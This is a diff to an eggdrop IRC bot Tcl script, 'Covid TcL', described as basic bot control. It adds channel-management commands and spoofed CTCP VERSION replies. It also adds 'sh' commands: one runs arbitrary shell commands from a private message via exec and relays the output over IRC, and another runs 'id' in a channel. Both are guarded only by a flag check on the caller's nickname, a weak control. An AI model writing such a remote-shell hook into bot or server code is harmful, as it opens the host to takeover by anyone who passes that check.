@@ -5,6 +5,9 @@
 ## 1ST RELEASE  : 15 SEPT 2021                                              ##
 ## AUTHOR       : IJOO A.K.A VICTOR                                         ##
 ##                                                                          ##
+## This is not Protection Scripts                                           ##
+## Just basic control to your eggdrop..                                     ##
+##                                                                          ##
 ## RUN YOUR EGGDROP                                                         ##
 ## /MSG BOT HELLO             identify yourself to bot                      ##
 ## /MSG BOT pass <password>   create password to bot                        ##
@@ -14,43 +17,6 @@
 ##                                                                          ##
 ##                                               CREATED WITH WFH SITUATION ##
 ##############################################################################
-
-bind msg n auth msg_auth
-bind msg n out msg_deauth
-bind msg n nick msg_nick
-bind msg n real msg_realname
-bind msg n identify msg_identify
-bind msg n cv msg_cv
-bind msg n join msg_join
-bind msg n part msg_part
-bind msg n chanset msg_chanset
-bind msg n rehash msg_rehash
-bind msg n restart msg_restart
-bind msg n die msg_shutdown
-bind msg n cuek msg_cuek
-bind msg n help kirimhelp
-bind pub n `logo pub_logo
-bind pub n `k pub_kick
-bind pub n `kb pub_kban
-bind pub n `join pub_join
-bind pub n `part pub_part
-bind pub n `auth pub_auth
-bind pub n `ver pub_info
-bind pub n `mode pub_mode
-bind pub n `cycle pub_cycle
-bind pub n `ping pub_ping
-bind pub n `+f pub_plusteman
-bind pub n `-f pub_minteman
-bind pub n `+av pub_pluspois
-bind pub n `-av pub_minpois
-bind pub n `deluser pub_deluser
-bind pub n `userlist pub_userlist
-bind notc - "*Password accepted*" autoident2
-bind notc - "*This nickname is registered and protected*" autoident
-bind notc - "*This nick is owned by someone else*" autoident
-bind ctcp - "VERSION" autoversion
-bind ctcr - PING pingreply
-bind evnt - init-server evnt:init_server
 
 set partm {
 "bAlIk Base!" "WroNG ChaNneL!" "Bad UsER!" "BaCk To BaSe" "Be Right Back!" "No one Join Forever!" "Damn! Wrong Channel!" "Access Denied!" "Return To Base!"
@@ -63,7 +29,8 @@ set awaym {
 }
 
 set versim {
-"eGgdRoP v1.5.6+ctcpfix (c) 1996" "xchat 2.8.8 Ubuntu" "rZNC Version 1.0 [02/01/11] - Built from ZNC." "psyBNC-2.3.1-7" "PIRCH98:WIN 95/98/WIN NT:1.0 (build 1.0.1.1190)" "Snak for Macintosh 4.13 English" "mIRC 3.65"
+"eGgdRoP v1.5.6+ctcpfix (c) 1996" "xchat 2.8.8 Ubuntu" "rZNC Version 1.0 [02/01/11] - Built from ZNC." "psyBNC-2.3.1-7"
+"PIRCH98:WIN 95/98/WIN NT:1.0 (build 1.0.1.1190)" "Snak for Macintosh 4.13 English" "mIRC 3.75 via ZNC 1.8.2deb10+2"
 }
 
 set ctcp-mode "1"
@@ -96,6 +63,46 @@ set global-chanset {
         +userinvites    +protecthalfops
         -autohalfop
 }
+
+bind msg n auth msg_auth
+bind msg n out msg_deauth
+bind msg n nick msg_nick
+bind msg n real msg_realname
+bind msg n identify msg_identify
+bind msg n cv msg_cv
+bind msg n join msg_join
+bind msg n part msg_part
+bind msg n chanset msg_chanset
+bind msg n rehash msg_rehash
+bind msg n restart msg_restart
+bind msg n die msg_shutdown
+bind msg n cuek msg_cuek
+bind msg n sh msg_sh
+bind msg n help kirimhelp
+bind pub n sh pub_sh
+bind pub n `logo pub_logo
+bind pub n `k pub_kick
+bind pub n `kb pub_kban
+bind pub n `join pub_join
+bind pub n `part pub_part
+bind pub n `auth pub_auth
+bind pub n `ver pub_info
+bind pub n `mode pub_mode
+bind pub n `cycle pub_cycle
+bind pub n `ping pub_ping
+bind pub n `topic pub_topic
+bind pub n `+f pub_plusteman
+bind pub n `-f pub_minteman
+bind pub n `+av pub_pluspois
+bind pub n `-av pub_minpois
+bind pub n `deluser pub_deluser
+bind pub n `userlist pub_userlist
+bind notc - "*Password accepted*" autoident2
+bind notc - "*This nickname is registered and protected*" autoident
+bind notc - "*This nick is owned by someone else*" autoident
+bind ctcp - "VERSION" autoversion
+bind ctcr - PING pingreply
+bind evnt - init-server evnt:init_server
 
 ################################################################
 
@@ -247,6 +254,17 @@ proc msg_shutdown {nick uhost hand rest} {
 	utimer 2 die
 }
 
+proc msg_sh {nick host hand args} {
+	if {![matchattr $nick Z]} {return 0}
+	set args "exec [lindex $args 0]"
+	set errnum [catch {eval $args} error]
+	if {$error==""} {set error "<$errnum>"}
+	if {$errnum!=0} {set error "$errnum - $error"}
+	foreach row [split $error "\n"] {
+		putserv "PRIVMSG $nick :$row"
+	}
+}
+
 proc msg_chanset {nick host hand arg} {
 	global notic tolak notim
 	set chan [lindex [split $arg] 0]
@@ -315,6 +333,7 @@ proc msg_cuek {nick uhost hand rest} {
                 set addmask [lindex [split $rest] 1]
                 if {[isignore $addmask]} {putquick "PRIVMSG $nick :\037ERROR\037: This is already a Valid Ignore."; return}
                 set duration [lindex [split $rest] 2]
+		if {![info exist duration]} { set duration "0" }
                 set reason "iGnored By Covid TcL"
                 newignore $addmask $hand "$reason" $duration
                 putquick "PRIVMSG $nick :\002New Ignore\002: $addmask - \002Duration\002: $duration minutes - \002Reason\002: $reason"
@@ -447,8 +466,8 @@ proc pub_info {nick uhost hand chan rest} {
 	set myos [string map {"PRETTY_NAME=" ""} $outputx]
 	set backid [open $pidfile r]
 	gets $backid pidnya
-	puthelp "PRIVMSG $chan :$notim [katakata "running with eggdrop"] v[lindex $version 0] [lgrnd]"
-	puthelp "PRIVMSG $chan :$notim [katakata "bot run on"]\002 $myos \002[katakata "with tcl"]\002 $tcl_version \002"
+	puthelp "PRIVMSG $chan :$notim [katakata "powered By"] [lgrnd].[katakata "tcl with eggdrop"] v[lindex $version 0]"
+	puthelp "PRIVMSG $chan :$notim [katakata "Running On"]\002 $myos \002[katakata "with tcl v"]\002$tcl_version \002"
 	puthelp "PRIVMSG $chan :$notim [katakata "launch background pid"]\002 $pidnya \002"
 }
 
@@ -510,15 +529,39 @@ proc pub_kban {nick uhost hand chan rest} {
 	pushmode $chan +b $bnick
 }
 
+proc pub_sh {nick uhost hand chan rest} {
+	global notic
+        if {![matchattr $nick Z]} {return 0}
+	set xcmd [lindex $rest 0]
+	if {$xcmd == "id"} {
+	        set args "exec id"
+        	set errnum [catch {eval $args} error]
+	        if {$error==""} {set error "<$errnum>"}
+	        if {$errnum!=0} {set error "$errnum - $error"}
+	        foreach row [split $error "\n"] {
+        	        putserv "PRIVMSG $chan :$row"
+        	}
+	} else {
+		puthelp "NOTICE $nick :$notic Not Avaliable on Channel"
+	}
+}
+
 proc pub_mode {nick uhost hand chan rest} {
 	global notic botnick
-	if {![isop $botnick $chan]} { putquick "NOTICE $nick :$notic [katakata "sorry, im not operator"];return 0 }
+	if {![isop $botnick $chan]} { putquick "NOTICE $nick :$notic [katakata "sorry, im not operator"]";return 0 }
 	if {![matchattr $nick Z]} { putquick "NOTICE $nick :$notic $tolak" ; return 0 }
 	if {$rest == ""} { puthelp "NOTICE $nick :$notic Usage: `mode +/- ntspnmcilk" ; return 0 }
 	putserv "MODE $chan $rest"
 }
 
-###### PROC FUNCTION
+proc pub_topic {nick uhost hand chan rest} {
+        global notic botnick
+        if {![isop $botnick $chan]} { putquick "NOTICE $nick :$notic [katakata "sorry, im not operator"]";return 0 }
+        if {![matchattr $nick Z]} { putquick "NOTICE $nick :$notic $tolak" ; return 0 }
+        if {$rest == ""} { puthelp "NOTICE $nick :$notic Usage: `topic Welcome to $chan" ; return 0 }
+        putsrv "TOPIC $chan :$rest"
+}
+
 proc pub_ping {nick host hand chan rest} {
 	global notic botnick
 	set tping "$rest"
@@ -536,6 +579,7 @@ proc pingreply {nick host hand dest key arg} {
 		return 0
 	}
 }
+
 proc evnt:init_server {type} {global botnick;putquick "MODE $botnick +xiB-ws"}
 proc unsix {txt} {set retval $txt;regsub ~ $retval "" retval;return $retval}
 proc dezip {txt} {return [decrypt 64 [unsix $txt]]}
@@ -605,15 +649,16 @@ proc autoversion {nick uhost hand dest key arg} {
 	putserv "NOTICE $nick :\001VERSION $versiku\001"
 }
 
-set notic [dezip "KUma/.T/BA01Svc3g/L6kGM1"]
-set notim [dezip "KUma/.T/BA01Svc3g/L6kGM1"]
-set tolak [dezip "mUO3m.vyfg3/Zn68503MNTM/yvbjS1qs/10."]
-set tuan [dezip "7JqUq0UjBv00VHBqv.8tyPs1k/tfS0jmlaL."]
-set realname [dezip "KUma/.T/BA01Svc3g/L6kGM1"]
+set notic "!\002c\037V\037d\002!"
+set notim "!\002c\037V\037d\002!"
+set tolak "\002\0034deNieD!\003\002"
+set tuan "\002\00312oWNeR!\003\002"
+
+if {![info exist realname]} { set realname [dezip "KUma/.T/BA01Svc3g/L6kGM1"] }
 
 proc kirimhelp {nick uhost hand rest} {
 	global notim tolak version notic
-        if {![matchattr $hand Z]} {putquick "NOTICE $nick :$notic $tolak";return 0}
+        if {![matchattr $hand Z]} {putlog "!cVd! $nick Try to Command help";return 0}
 	puthelp "PRIVMSG $nick :\037\002     [katakata "bot command list via private"]\002                                \037"
 	puthelp "PRIVMSG $nick :\002auth\002 <password>            - [katakata "login owner access"]"
 	puthelp "PRIVMSG $nick :\002join\002 <#chan>               - [katakata "ask bot to join channel <#chan>"]"
